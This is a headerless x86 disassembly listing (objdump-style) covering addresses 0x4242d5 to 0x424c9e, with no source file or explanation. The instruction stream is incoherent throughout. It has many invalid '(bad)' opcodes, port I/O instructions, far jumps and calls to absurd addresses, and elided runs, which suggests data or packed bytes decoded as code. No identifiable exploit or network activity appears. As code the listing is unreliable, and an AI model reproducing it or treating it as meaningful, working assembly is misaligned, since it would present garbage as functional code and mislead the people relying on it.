  4242d5:	jbe    0x4242bd
  4242d7:	sbb    DWORD PTR [ebx+0x6],0xffffffd1
  4242db:	sbb    DWORD PTR [eax-0x80],0x81eaf8a6
  4242e2:	inc    ebx
  4242e3:	lock dec ebx
  4242e5:	in     al,dx
  4242e6:	jmp    0x0:0x8e
	...
  424301:	mov    dh,0xe8
  424303:	ss out dx,al
  424305:	not    ecx
  424307:	arpl   WORD PTR [edi-0x7e728a09],ax
  42430d:	mov    ebx,0x206dfe6c
  424312:	jbe    0x42437d
  424314:	dec    ecx
  424315:	test   esi,0x78befbff
  42431b:	inc    edx
  42431c:	cmc    
  42431d:	je     0x4242ea
  42431f:	outs   dx,DWORD PTR ds:[esi]
  424320:	fcom   QWORD PTR [edi-0x27]
  424323:	pop    ebp
  424324:	ret    0x4370
  424327:	ja     0x424349
  424329:	cmp    ebx,edx
  42432b:	mov    BYTE PTR ds:0xf15f6977,bh
  424331:	test   DWORD PTR [ecx+edx*2],0x7f27497
  424338:	cli    
  424339:	xor    BYTE PTR [ebx-0x2580ba8e],cl
  42433f:	sti    
  424340:	adc    esi,edx
  424342:	adc    bh,bh
  424344:	call   0x6d4ef8bc
  424349:	mov    bh,0x76
  42434b:	cld    
  42434c:	jmp    0x74412f11
  424351:	mov    ebx,0xa2fe4f71
  424356:	popa   
  424357:	mov    BYTE PTR [edi+ebx*1-0xfb801a2],ch
  42435e:	add    al,0x89
  424360:	fnstenv [edx-0x3e]
  424363:	jecxz  0x4243d5
	...
  42437d:	add    BYTE PTR [edx+0xabae76d],al
  424383:	jbe    0x424381
  424385:	push   0x75
  424387:	js     0x424395
  424389:	ins    DWORD PTR es:[edi],dx
  42438a:	(bad)  
  42438b:	jne    0x424389
  42438d:	jmp    0xfa492ece
  424392:	test   eax,0xcd10c58c
  424397:	data16 cmp BYTE PTR [ebx-0x16077e1c],0xf7
  42439f:	add    al,0x6a
  4243a1:	and    al,BYTE PTR [ebx-0x67ce1c06]
  4243a7:	ret    0x3a
  4243aa:	or     eax,0x884c6a01
  4243af:	jbe    0x424385
  4243b1:	pop    eax
  4243b2:	jne    0x4243eb
  4243b4:	cmp    DWORD PTR [eax],eax
  4243b6:	sbb    eax,0x3889d230
  4243bb:	or     DWORD PTR [edi],esi
  4243bd:	repz or cl,BYTE PTR [ebx+0x8dd00d4]
  4243c4:	xchg   DWORD PTR [ebp-0x2b],ecx
  4243c7:	add    DWORD PTR [ecx-0xc],0x89883c66
  4243ce:	mov    al,ds:0xdaf681f8
  4243d3:	mov    WORD PTR [eax+eax*1+0x3e8008dd],?
  4243da:	int    0x15
  4243dc:	test   BYTE PTR [edi-0x74fff733],ch
	...
  4243fa:	add    BYTE PTR [ecx+0x78890080],cl
  424400:	call   0x8ced4386
  424405:	pushf  
  424406:	add    BYTE PTR [ebp-0x62c07ff8],cl
  42440c:	adc    eax,0x89d9784
  424411:	add    BYTE PTR [ebx-0x7afb7ec7],cl
  424417:	mov    dh,0x4
  424419:	test   BYTE PTR [ebx-0x7ffff7a3],cl
  42441f:	push   es
  424420:	or     DWORD PTR [ebx],ecx
  424422:	test   bh,cl
  424424:	or     BYTE PTR [eax],al
  424426:	add    dh,cl
  424428:	sar    bl,0x50
  42442b:	out    dx,eax
  42442c:	jg     0x4243f5
  42442e:	call   0x3ee14d
  424433:	ror    al,1
  424435:	jo     0x424468
  424437:	enter  0xe03d,0x53
  42443b:	hlt    
  42443c:	sub    eax,0x5dfc37bd
  424441:	add    BYTE PTR [ebx-0x38b4197],cl
  424447:	sbb    edx,DWORD PTR [esi+0x5df4a633]
  42444d:	fist   DWORD PTR [esi+0x77]
  424450:	idiv   BYTE PTR [ebx+esi*2-0x5e]
  424454:	test   BYTE PTR [ebp+0x4e],0x69
  424458:	mov    eax,ds:0xfb13e77c
  42445d:	add    eax,DWORD PTR [eax]
	...
  424477:	add    BYTE PTR [eax+0x1d],dh
  42447a:	clc    
  42447b:	dec    esp
  42447c:	outs   dx,DWORD PTR ds:[esi]
  42447d:	mov    al,0x70
  42447f:	mov    BYTE PTR [ecx-0x42],bl
  424482:	aam    0x55
  424484:	and    DWORD PTR [eax+0x758b4f58],0xf8f40008
  42448e:	mov    dh,0x9f
  424490:	ret    
  424491:	adc    bh,BYTE PTR [ebp-0x19]
  424494:	mov    dl,0xc0
  424496:	add    eax,DWORD PTR [eax]
  424498:	ja     0x4244c3
  42449a:	adc    BYTE PTR [ecx+0x28f80a9c],al
  4244a0:	outs   dx,DWORD PTR ds:[esi]
  4244a1:	and    edx,ebx
  4244a3:	mov    al,BYTE PTR [ecx+0x7a]
  4244a6:	push   0x5d6aeb
  4244ab:	test   BYTE PTR [ecx+edx*8+0x7631811f],dh
  4244b2:	or     ecx,DWORD PTR [ecx-0x2f769a47]
  4244b8:	das    
  4244b9:	sub    DWORD PTR [esp+ecx*1+0x76],edi
  4244bd:	jae    0x42453c
  4244bf:	cld    
  4244c0:	pop    ebx
  4244c1:	push   esi
  4244c2:	or     al,0xfd
  4244c4:	leave  
  4244c5:	mov    ecx,0x5d823e68
  4244ca:	add    BYTE PTR [ecx+0x3a304d9],al
  4244d0:	ins    DWORD PTR es:[edi],dx
  4244d1:	leave  
  4244d2:	sahf   
  4244d3:	mov    ch,BYTE PTR [esi+0x61cd7e78]
  4244d9:	add    al,0xe7
  4244db:	fiadd  WORD PTR [eax]
	...
  4244f5:	ins    BYTE PTR es:[edi],dx
  4244f6:	leave  
  4244f7:	sbb    ch,0xbc
  4244fa:	cmp    eax,0xd9f407a8
  4244ff:	popa   
  424500:	outs   dx,DWORD PTR ds:[esi]
  424501:	jl     0x4244cc
  424503:	fiadd  DWORD PTR [edi+ecx*1-0xbfc1704]
  42450a:	fld    TBYTE PTR [ecx+0x43]
  42450d:	pop    ds
  42450e:	aad    0x55
  424510:	clc    
  424511:	repz jg 0x424577
  424514:	jnp    0x4244f4
  424516:	jb     0x42455d
  424518:	shr    DWORD PTR [esp+ebp*2+0x4e],cl
  42451c:	dec    esp
  42451d:	enter  0x3572,0x88
  424521:	mov    edi,ecx
  424523:	lds    esi,FWORD PTR [ebp+0x38]
  424526:	or     ecx,ebp
  424528:	imul   DWORD PTR [eax]
  42452a:	and    BYTE PTR [ebx+0x7b],0xae
  42452e:	jb     0x424545
  424530:	rcl    DWORD PTR [ebx-0x5f81f332],cl
  424536:	jl     0x4244e3
  424538:	emms   
  42453a:	inc    ebp
  42453b:	jb     0x42457c
  42453d:	and    eax,0xe67e96db
  424542:	dec    eax
  424543:	fadd   st,st(3)
  424545:	cmp    DWORD PTR [edi+0x35],0x10
  424549:	ins    DWORD PTR es:[edi],dx
  42454a:	dec    ebp
  42454b:	imul   esi,ebp,0xfffffffb
  42454e:	add    eax,0xb7f86ca2
  424553:	out    0x3,al
  424555:	js     0x42459c
  424557:	cmp    dl,BYTE PTR [esi]
	...
  424571:	add    BYTE PTR [ebp-0x36],ch
  424574:	jmp    0x43b5:0xffd5fa00
  42457b:	dec    BYTE PTR [edi-0x52]
  42457e:	jmp    0x424540
  424580:	adc    eax,0xc383f029
  424585:	in     eax,dx
  424586:	test   bh,0xb
  424589:	xchg   esi,eax
  42458a:	and    edi,esi
  42458c:	out    0x3e,eax
  42458e:	imul   esi,DWORD PTR [edx-0x4],0x27
  424592:	cmp    eax,0xf6e54478
  424597:	clc    
  424598:	or     esp,DWORD PTR [ebx+esi*2+0x7a]
  42459c:	cli    
  42459d:	outs   dx,BYTE PTR ds:[esi]
  42459e:	add    ecx,0x711df7e7
  4245a4:	cld    
  4245a5:	sbb    bh,BYTE PTR [eax]
  4245a7:	rol    esi,1
  4245a9:	sub    edi,eax
  4245ab:	add    al,0x53
  4245ad:	bound  esp,QWORD PTR [ebp+eax*4-0x1d]
  4245b1:	inc    ecx
  4245b2:	ja     0x424611
  4245b4:	dec    ebx
  4245b5:	jmp    0x4245ae
  4245b7:	add    al,0x56
  4245b9:	ret    
  4245ba:	mov    eax,0x3405737e
  4245bf:	int    0xe7
  4245c1:	xor    ch,bh
  4245c3:	add    al,0x0
  4245c5:	jb     0x424601
  4245c7:	jg     0x424614
  4245c9:	int    0xbf
  4245cb:	ret    0xa586
  4245ce:	(bad)  
  4245d0:	xor    BYTE PTR [ecx],ch
  4245d2:	rol    cl,0x69
  4245d5:	enter  0x0,0x0
	...
  4245ed:	add    BYTE PTR [eax],al
  4245ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245f0:	dec    eax
  4245f1:	inc    ebx
  4245f2:	int    0xeb
  4245f4:	adc    al,0x77
  4245f6:	test   eax,0xd5b89f7
  4245fb:	ror    BYTE PTR [ecx-0x75e3fabd],1
  424601:	inc    ebx
  424602:	or     eax,0x31127018
  424607:	add    eax,0xc8ffffc5
  42460c:	lds    esi,FWORD PTR [ecx+0x6e]
  42460f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424610:	pop    eax
  424611:	mov    DWORD PTR [ecx+edi*8+0x2c],esi
  424615:	pop    eax
  424616:	call   0x4272bb
  42461b:	ror    BYTE PTR [ecx+0x20],0x8
  42461f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424620:	dec    ecx
  424621:	and    BYTE PTR [eax],bl
  424623:	nop
  424624:	dec    ecx
  424625:	and    BYTE PTR [eax-0x6c],cl
  424628:	dec    ecx
  424629:	and    BYTE PTR [eax+eiz*4],bl
  42462c:	dec    ecx
  42462d:	and    BYTE PTR [esp+eax*4],al
  424630:	dec    ecx
  424631:	and    BYTE PTR [eax+edx*4],ah
  424634:	dec    ecx
  424635:	and    BYTE PTR [eax-0x23],cl
  424638:	or     DWORD PTR [eax+0x24],0x2440c7f1
  42463f:	stc    
  424640:	cld    
  424641:	(bad)  
  424642:	(bad)  
  424643:	(bad)  
  424645:	inc    eax
  424646:	and    al,0xe1
  424648:	add    eax,DWORD PTR [eax]
  42464a:	add    ch,cl
  42464c:	leave  
  42464d:	inc    eax
  42464e:	and    al,0xcd
  424650:	push   es
	...
  424669:	add    BYTE PTR [eax],al
  42466b:	add    ch,bl
  42466d:	fsub   QWORD PTR [ecx+edi*1]
  424670:	int    0x4
  424672:	xchg   esi,eax
  424674:	jge    0x4246f5
  424676:	inc    eax
  424677:	and    al,0x61
  424679:	push   esp
  42467a:	dec    esp
  42467b:	call   0x3e40cb
  424680:	sbb    ah,al
  424682:	jo     0x424696
  424684:	and    BYTE PTR [eax+0x20],cl
  424687:	dec    eax
  424688:	ins    DWORD PTR es:[edi],dx
  424689:	jg     0x4246d3
  42468b:	and    al,0xa1
  42468d:	jnp    0x4246cf
  42468f:	and    al,0xad
  424691:	fadd   QWORD PTR [eax]
  424693:	cmp    DWORD PTR [ebp+0x5fc3f604],ecx
  424699:	pusha  
  42469a:	push   cs
  42469b:	mov    esi,esp
  42469d:	and    DWORD PTR [eax],esp
  42469f:	adc    BYTE PTR [edi+0x11],ch
  4246a2:	or     al,0x87
  4246a4:	cmc    
  4246a5:	repnz mov edi,0xc6f2e823
  4246ab:	or     edi,DWORD PTR [ebp+0x5d]
  4246ae:	(bad)  
  4246af:	mov    BYTE PTR [ecx+0x1],bl
  4246b2:	inc    esi
  4246b3:	pop    es
  4246b4:	hlt    
  4246b5:	xor    BYTE PTR [ebp-0x207d8815],cl
  4246bb:	push   eax
  4246bc:	ret    0x872e
  4246bf:	inc    edx
  4246c0:	and    BYTE PTR [esi],ch
  4246c2:	xchg   DWORD PTR [edx+0x20],eax
  4246c5:	push   cs
  4246c6:	out    dx,al
  4246c7:	add    DWORD PTR [edi+0xbfd1595],ebp
  4246cd:	div    DWORD PTR [ecx+ebx*8]
	...
  4246e8:	add    BYTE PTR [ebp-0x56968800],bh
  4246ee:	jbe    0x4246af
  4246f0:	pop    edx
  4246f1:	call   0x4ce235d6
  4246f6:	(bad)  
  4246f7:	arpl   WORD PTR [ecx],di
  4246f9:	hlt    
  4246fa:	pop    ebp
  4246fb:	jmp    0xdc57:0x6c48694d
  424702:	into   
  424703:	cmp    eax,0x40e2f400
  424708:	sbb    BYTE PTR [edi-0x4876fd47],0xad
  42470f:	xchg   DWORD PTR [edx+0x54],eax
  424712:	lods   eax,DWORD PTR ds:[esi]
  424713:	jmp    0x9bfe:0xea5e1dff
  42471a:	mov    ah,BYTE PTR [esi]
  42471c:	call   FWORD PTR [ebx+0x27133fda]
  424722:	push   ss
  424723:	loop   0x4246d8
  424725:	hlt    
  424726:	pop    ebp
  424727:	fstp   DWORD PTR [ebp+0x1f]
  42472a:	and    eax,0x46f5245
  42472f:	rol    DWORD PTR [esi-0x2dc5d3a1],cl
  424735:	rcr    ah,0xea
  424738:	adc    esi,esp
  42473a:	add    al,0x62
  42473c:	jnp    0x4247aa
  42473e:	leave  
  42473f:	(bad)  
  424740:	xchg   bl,dh
  424742:	add    al,0x6a
  424744:	and    dh,ah
  424746:	fcmovu st,st(6)
  424748:	jp     0x424750
  42474a:	dec    ebp
  42474b:	xchg   esp,eax
  42474c:	mov    BYTE PTR [eax],0x0
	...
  424763:	add    BYTE PTR [eax],al
  424765:	add    BYTE PTR [ebx],bh
  424767:	outs   dx,BYTE PTR ds:[esi]
  424768:	sti    
  424769:	pop    ds
  42476a:	add    eax,ebp
  42476c:	out    0x8e,al
  42476e:	inc    ebx
  42476f:	jge    0x4247a4
  424771:	jo     0x4247e9
  424773:	dec    ebx
  424774:	adc    eax,DWORD PTR [ebx]
  424776:	out    0x44,al
  424778:	(bad)  
  424779:	lods   eax,DWORD PTR ds:[esi]
  42477a:	adc    ebp,DWORD PTR [edi-0x1a]
  42477d:	jp     0x424705
  42477f:	add    BYTE PTR [esi+0x10],dh
  424782:	les    edx,FWORD PTR ds:0x1c8e0427
  424788:	(bad)
  42478b:	enter  0xed2a,0xeb
  42478f:	mov    esi,0x4dcc02c
  424794:	dec    esi
  424795:	adc    BYTE PTR [edi+edx*1-0x59],al
  424799:	add    edi,DWORD PTR [ebx-0x8]
  42479c:	sub    al,BYTE PTR [esi-0x279ffe49]
  4247a2:	mov    ds:0xf413e6af,eax
  4247a7:	add    al,0x67
  4247a9:	clc    
  4247aa:	pop    es
  4247ab:	add    eax,0xc87f1694
  4247b0:	or     dl,bl
  4247b2:	dec    ecx
  4247b3:	outs   dx,BYTE PTR ds:[esi]
  4247b4:	xchg   ebx,eax
  4247b5:	outs   dx,DWORD PTR ds:[esi]
  4247b6:	cwde   
  4247b7:	clc    
  4247b8:	out    dx,al
  4247b9:	jp     0x4247a1
  4247bb:	xchg   esp,eax
  4247bc:	rol    ebx,cl
  4247be:	mov    ebx,DWORD PTR [ebx-0x1]
  4247c1:	(bad)  
  4247c3:	repnz pop ss
  4247c5:	pop    esp
  4247c6:	mov    ah,0x3a
  4247c8:	imul   esi,ecx,0x0
	...
  4247e2:	add    BYTE PTR [edi+0x71],al
  4247e5:	jb     0x4247d8
  4247e7:	jle    0x4247dc
  4247e9:	jecxz  0x4247c1
  4247eb:	repz cwde 
  4247ed:	adc    ch,BYTE PTR [ecx]
  4247ef:	lock cmp DWORD PTR [edi+0x126ff03c],0xffc4e0ed
  4247fa:	repz mov ds:0x4ae90004,al
  424800:	jnp    0xe8174432
  424806:	cmp    DWORD PTR [ebp+0x6682fc6f],0x9b855a7d
  424810:	dec    esp
  424811:	jae    0x4247ed
  424813:	mov    edx,?
  424815:	repz jb 0x424863
  424818:	(bad)  
  424819:	out    0xb0,eax
  42481b:	push   ebx
  42481c:	outs   dx,BYTE PTR ds:[esi]
  42481d:	cld    
  42481e:	fs mov al,0xf2
  424821:	lahf   
  424822:	das    
  424823:	mov    bl,0x6c
  424825:	call   FWORD PTR [ebp-0x25]
  424828:	jno    0x424811
  42482a:	jp     0x4247d5
  42482c:	ins    DWORD PTR es:[edi],dx
  42482d:	cld    
  42482e:	imul   esp,ebx,0x1bbff6c
  424834:	jl     0x424878
  424836:	(bad)  [esi+ebx*1-0x18]
  42483a:	push   0xffffff89
  42483c:	ins    DWORD PTR es:[edi],dx
  42483d:	cld    
  42483e:	arpl   WORD PTR [ebx+0x6c],di
  424841:	pop    esp
  424842:	(bad)  
  424843:	rol    BYTE PTR [esi-0x3f],1
  424846:	cmc    
	...
  42485f:	add    bh,dh
  424861:	ror    DWORD PTR [eax-0x89e86fb],1
  424867:	push   0xc
  424869:	xor    al,BYTE PTR [ecx+0x80d4900]
  42486f:	jmp    FWORD PTR [esi-0x80]
  424872:	sbb    DWORD PTR [eax],ebx
  424874:	lahf   
  424875:	inc    ecx
  424876:	cld    
  424877:	push   ebp
  424878:	bound  ebx,QWORD PTR [ecx+0x48]
  42487b:	int3   
  42487c:	push   ds
  42487d:	or     DWORD PTR [edi-0x7827b508],eax
  424883:	aaa    
  424884:	xor    eax,0x2afff628
  424889:	mov    ah,dh
  42488b:	dec    DWORD PTR [edx-0x13]
  42488e:	cld    
  42488f:	add    DWORD PTR [ebp+0x1],ebx
  424892:	xchg   DWORD PTR ds:0x3fbcb1,ecx
  424898:	mov    dh,0xc8
  42489a:	and    al,0x8d
  42489c:	push   ecx
  42489d:	stc    
  42489e:	cs leave 
  4248a0:	adc    al,0x3b
  4248a2:	adc    BYTE PTR [edi],cl
  4248a4:	xchg   ebx,eax
  4248a5:	(bad)  
  4248a7:	dec    DWORD PTR ds:0x1c147a88
  4248ad:	pop    esi
  4248ae:	push   cs
  4248af:	mov    edx,ebx
  4248b1:	sbb    BYTE PTR ds:0x65d1148,dh
  4248b7:	mov    edx,ebx
  4248b9:	and    al,0x85
  4248bb:	pop    es
  4248bc:	inc    esp
  4248bd:	xlat   BYTE PTR ds:[ebx]
  4248be:	std    
  4248bf:	(bad)  
  4248c0:	fnstsw WORD PTR [ecx+0x41]
  4248c3:	adc    BYTE PTR [eax],al
	...
  4248dd:	push   es
  4248de:	enter  0x270,0x54
  4248e2:	add    BYTE PTR [edi+0x7e],bh
  4248e5:	fldln2 
  4248e7:	or     eax,DWORD PTR [ebp+0x7b3]
  4248ed:	push   esi
  4248ee:	inc    esi
  4248ef:	add    al,0xc6
  4248f1:	xchg   ebx,eax
  4248f2:	ins    BYTE PTR es:[edi],dx
  4248f3:	std    
  4248f4:	mov    ebp,0x3fc469
  4248f9:	arpl   WORD PTR [edi+0x40],di
  4248fc:	and    al,0xf4
  4248fe:	jno    0x424977
  424900:	adc    bh,al
  424902:	outs   dx,DWORD PTR ds:[esi]
  424903:	sar    bh,0x92
  424906:	jmp    0x4272d423
  42490b:	sub    al,0xfd
  42490d:	or     DWORD PTR [edx-0x30],ecx
  424910:	cld    
  424911:	add    BYTE PTR [edx+0x1c],al
  424914:	mov    edi,DWORD PTR [eax+0x23fcbff9]
  42491a:	push   esi
  42491b:	out    dx,al
  42491c:	std    
  42491d:	arpl   WORD PTR [ebx-0x33],dx
  424920:	xchg   DWORD PTR [eax+0x27fd0d01],esi
  424926:	imul   DWORD PTR [eax+ebp*8]
  424929:	ins    DWORD PTR es:[edi],dx
  42492a:	mov    cl,0x74
  42492c:	cld    
  42492d:	outs   dx,DWORD PTR ds:[esi]
  42492e:	scas   al,BYTE PTR es:[edi]
  42492f:	cmp    ch,0x3b
  424932:	dec    ebx
  424933:	jl     0x4248c0
  424935:	cmc    
  424936:	pop    ebp
  424937:	add    BYTE PTR [eax+0x1141a8],al
  42493d:	repz fst DWORD PTR [edx+0xfe]
	...
  424958:	add    BYTE PTR [eax],al
  42495a:	sbb    ebx,DWORD PTR [esi-0x17]
  42495d:	cmc    
  42495e:	fcomp  QWORD PTR [esi+0x2f]
  424961:	cmp    BYTE PTR fs:[edi],bl
  424964:	add    al,0x8b
  424966:	mov    eax,0x32501c39
  42496b:	and    al,0x0
  42496d:	add    bl,dh
  42496f:	or     ch,BYTE PTR [ebp+ebx*1-0x4]
  424973:	pop    esp
  424974:	add    BYTE PTR [ebx+0x4f27fa30],cl
  42497a:	ins    DWORD PTR es:[edi],dx
  42497b:	mov    eax,ds:0x5a7f241c
  424980:	out    0xfe,al
  424982:	cmp    edx,esi
  424984:	pop    eax
  424985:	push   es
  424986:	cmc    
  424987:	pop    ebp
  424988:	mov    eax,DWORD PTR [ebx+0x10]
  42498b:	push   es
  42498c:	mov    DWORD PTR [ebp+0x4],eax
  42498f:	add    eax,0x2cd7c070
  424994:	jb     0x424954
  424996:	pop    es
  424997:	cmp    BYTE PTR [edx],dh
  424999:	lea    esi,[edi]
  42499b:	and    ebx,ecx
  42499d:	cmp    al,0x30
  42499f:	and    edi,eax
  4249a1:	push   es
  4249a2:	jo     0x424947
  4249a4:	out    0x3,al
  4249a6:	hlt    
  4249a7:	jns    0x424953
  4249a9:	pop    ds
  4249aa:	aam    0xd4
  4249ac:	dec    BYTE PTR [ebx+0x7fe56b80]
  4249b2:	stos   DWORD PTR es:[edi],eax
  4249b3:	sti    
  4249b4:	bound  edx,QWORD PTR [eax-0x1619949d]
  4249ba:	cli    
  4249bb:	imul   edx,DWORD PTR ds:0x6c,0x0
	...
  4249d6:	add    BYTE PTR [esp+edi*8+0x6c7d03e7],dh
  4249dd:	add    DWORD PTR [ebx-0x39],edi
  4249e0:	or     eax,0xf0d93d4d
  4249e5:	fdiv   QWORD PTR [esi-0x59]
  4249e8:	and    bl,bl
  4249ea:	jbe    0x424993
  4249ec:	and    bl,dl
  4249ee:	into   
  4249ef:	sbb    esi,DWORD PTR [edi-0x2c0bfb1b]
  4249f5:	jle    0x424a1c
  4249f7:	inc    esi
  4249f8:	add    al,0xe7
  4249fa:	jbe    0x424983
  4249fc:	and    bh,al
  4249fe:	mov    dh,BYTE PTR [edi+0x13d2bf20]
  424a04:	xor    BYTE PTR [edi+0x3],cl
  424a07:	hlt    
  424a08:	jnp    0x4249b4
  424a0a:	pop    ds
  424a0b:	or     al,0x2e
  424a0d:	sub    ch,bh
  424a0f:	dec    eax
  424a10:	lods   eax,DWORD PTR ds:[esi]
  424a11:	out    0x13,al
  424a13:	hlt    
  424a14:	add    al,0x60
  424a16:	mov    edi,0x4e4f0917
  424a1b:	call   0x2e:0xcb8ae705
  424a22:	xor    cl,bl
  424a24:	sub    al,0x8b
  424a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a27:	adc    ecx,DWORD PTR [ecx]
  424a29:	push   eax
  424a2a:	mov    esi,0xc923f622
  424a2f:	loop   0x424a31
  424a31:	push   eax
  424a32:	jmp    0xf53f4f2e
  424a37:	adc    edx,DWORD PTR [edi]
  424a39:	inc    eax
  424a3a:	jmp    0x424a3f
	...
  424a53:	add    BYTE PTR [edx+ebp*4+0x73],dh
  424a57:	jecxz  0x424ac7
  424a59:	rol    DWORD PTR [edi],0xb2
  424a5c:	not    BYTE PTR ss:[eax]
  424a5f:	xchg   DWORD PTR [eax],esi
  424a61:	or     eax,0xf5e0f774
  424a66:	and    edx,DWORD PTR ds:0x1d23f5e9
  424a6c:	inc    eax
  424a6d:	bound  ecx,QWORD PTR [esi+ebx*8-0xa]
  424a71:	add    al,0x55
  424a73:	sar    DWORD PTR [esi-0x37170066],1
  424a79:	cmc    
  424a7a:	and    edx,ecx
  424a7c:	iret   
  424a7d:	stos   BYTE PTR es:[edi],al
  424a7e:	scas   al,BYTE PTR es:[edi]
  424a7f:	jmp    0xcdb5b27b
  424a84:	xlat   BYTE PTR ds:[ebx]
  424a85:	pop    esp
  424a86:	mov    bh,0x58
  424a88:	clc    
  424a89:	add    al,0xfd
  424a8b:	sbb    eax,0x3ee81cd4
  424a90:	inc    edi
  424a91:	push   0xfffffffc
  424a93:	jb     0x424ac9
  424a95:	xor    BYTE PTR es:[eax+0x42],dh
  424a99:	adc    cl,BYTE PTR [ecx-0x78cf2bd3]
  424a9f:	daa    
  424aa0:	or     al,0x7c
  424aa2:	inc    ebp
  424aa3:	add    eax,0xd5fc7175
  424aa8:	(bad)  
  424aa9:	sbb    al,0x46
  424aab:	or     DWORD PTR [ebp+0x71],ebp
  424aae:	jae    0x424ac1
  424ab0:	jne    0x424aa0
  424ab2:	pop    es
  424ab3:	add    ch,bl
  424ab5:	pop    edx
  424ab6:	push   cs
  424ab7:	push   0x0
	...
  424ad0:	add    ch,cl
  424ad2:	adc    eax,0x1450000
  424ad7:	and    BYTE PTR [eax],al
  424ad9:	popf   
  424ada:	fst    st(6)
  424adc:	cmp    DWORD PTR [ebp-0x6eba7afb],ebx
  424ae2:	cs jns 0x424af1
  424ae5:	xchg   edx,eax
  424ae6:	inc    ebx
  424ae7:	jns    0x424af5
  424ae9:	push   ds
  424aea:	jb     0x424af0
  424aec:	add    BYTE PTR [ecx],cl
  424aee:	adc    eax,0x4954687
  424af3:	inc    esi
  424af4:	and    BYTE PTR [edx+0x55],bl
  424af7:	sti    
  424af8:	jne    0x424b4f
  424afa:	fst    QWORD PTR [ebp-0x2faa24f]
  424b00:	jge    0x424aef
  424b02:	jnp    0x424b45
  424b04:	adc    al,cl
  424b06:	lds    esi,FWORD PTR [eax+0x2]
  424b09:	aam    0x2d
  424b0b:	ret    
  424b0c:	inc    esp
  424b0d:	stc    
  424b0e:	adc    al,0xfd
  424b10:	dec    DWORD PTR [ebp+0x5]
  424b13:	push   0xfc44914c
  424b18:	dec    BYTE PTR [eax+0x11]
  424b1b:	adc    al,BYTE PTR [eax+0x1d]
  424b1e:	jl     0x424b60
  424b20:	and    al,0x29
  424b22:	push   eax
  424b23:	pop    edx
  424b24:	pop    ebx
  424b25:	xchg   esi,eax
  424b26:	retf   0xc259
  424b29:	or     DWORD PTR ds:0x14397c80,eax
  424b2f:	add    BYTE PTR [esi+edx*1-0x10],dh
  424b33:	jo     0x424b59
	...
  424b4d:	add    BYTE PTR ds:0xddb11ddd,bh
  424b53:	add    al,0x7f
  424b55:	(bad)  
  424b56:	push   edx
  424b57:	pop    eax
  424b58:	or     DWORD PTR [ecx+0x3fc0b9],esp
  424b5e:	hlt    
  424b5f:	inc    edx
  424b60:	push   0x27
  424b62:	mov    edx,0xf403faa2
  424b67:	fcmovu st,st(4)
  424b69:	and    ebp,eax
  424b6b:	pop    ebp
  424b6c:	call   0xa05654
  424b71:	std    
  424b72:	or     DWORD PTR [edx+0xe],esi
  424b75:	inc    eax
  424b76:	hlt    
  424b77:	adc    ch,BYTE PTR [ebp+0x7ffa6f52]
  424b7d:	jmp    0x424b83
  424b7f:	stos   DWORD PTR es:[edi],eax
  424b80:	out    0x43,al
  424b82:	sub    ah,bl
  424b84:	pop    eax
  424b85:	out    0x95,eax
  424b87:	sub    eax,0xa16f0001
  424b8c:	or     ch,al
  424b8e:	repnz pop esp
  424b90:	add    BYTE PTR [eax],al
  424b92:	hlt    
  424b93:	in     al,0xba
  424b95:	add    esi,DWORD PTR [ecx+0x5f]
  424b98:	div    DWORD PTR [eax]
  424b9a:	push   0xffffff9b
  424b9c:	add    dh,BYTE PTR [ebx+0x14]
  424b9f:	fld    TBYTE PTR [ebx+eax*1-0x36]
  424ba3:	jb     0x424b28
  424ba5:	cmp    al,0xdc
  424ba7:	pop    ebp
  424ba8:	hlt    
  424ba9:	dec    eax
  424bab:	dec    edx
  424bac:	push   ebx
  424bad:	call   0x50ffa980
	...
  424bca:	add    bl,cl
  424bcc:	ret    
  424bcd:	add    eax,DWORD PTR [edi+0x325871ca]
  424bd3:	retf   0x5d
  424bd6:	jmp    0xfd072cd7
  424bdb:	stos   DWORD PTR es:[edi],eax
  424bdc:	in     al,0xc9
  424bde:	or     ebx,DWORD PTR [ecx+edi*4]
  424be1:	mov    edi,edi
  424be3:	add    edx,DWORD PTR [ebx+0x61aa8afd]
  424be9:	ror    DWORD PTR [edi-0x24],cl
  424bec:	inc    ecx
  424bed:	push   es
  424bee:	(bad)  
  424bef:	jmp    0x424bf5
  424bf1:	jo     0x424bbd
  424bf3:	sti    
  424bf4:	and    DWORD PTR [esi],0x2732f0f9
  424bfa:	pop    ebp
  424bfb:	mov    BYTE PTR [edi+eiz*8],0x3
  424bff:	jg     0x424bbf
  424c01:	fcmovbe st,st(3)
  424c03:	jbe    0x424c6c
  424c05:	in     eax,dx
  424c06:	mov    BYTE PTR [esi+0x1c03e704],dl
  424c0c:	and    al,0xe7
  424c0e:	add    esi,DWORD PTR [edi+eiz*2-0x65]
  424c12:	sti    
  424c13:	fwait
  424c14:	cmp    ebp,esp
  424c16:	add    al,0xf4
  424c18:	iret   
  424c19:	pop    edi
  424c1a:	retf   0x7a03
  424c1d:	mov    ds:0xab7a3b6f,eax
  424c22:	jae    0x424c57
  424c24:	fcmovne st,st(3)
  424c26:	jb     0x424c2e
  424c28:	std    
  424c29:	sub    eax,0xe6fd6fc9
  424c2e:	add    eax,DWORD PTR [eax]
	...
  424c48:	hlt    
  424c49:	addr16 sti 
  424c4b:	inc    ebx
  424c4c:	push   es
  424c4d:	(bad)
  424c50:	arpl   WORD PTR ds:0xc20b185c,ax
  424c56:	retf   0xf8f9
  424c59:	test   BYTE PTR [ebx+0x74],al
  424c5c:	mov    bl,0xf1
  424c5e:	inc    ecx
  424c5f:	xchg   DWORD PTR [esi+0x5ff8ea68],edi
  424c65:	jl     0x424c8b
  424c67:	or     al,0x7f
  424c69:	mov    esi,0x59bd3c6
  424c6e:	out    0x3,eax
  424c70:	je     0x424cd9
  424c72:	sbb    edi,esp
  424c74:	sbb    eax,DWORD PTR [ecx+0x7df404e5]
  424c7a:	sub    al,0x10
  424c7c:	ins    DWORD PTR es:[edi],dx
  424c7d:	rcl    esi,0x80
  424c80:	mov    bl,0x67
  424c82:	jmp    DWORD PTR [edi+0x60]
  424c85:	imul   edi,esp,0xaeff7de
  424c8b:	jb     0x424c41
  424c8d:	cli    
  424c8e:	xor    BYTE PTR [eax],0xe3
  424c91:	add    BYTE PTR [edi+0x457e1ba7],al
  424c97:	add    DWORD PTR [edx-0x404302f6],ebp
  424c9d:	pop    esi
  424c9e:	std    
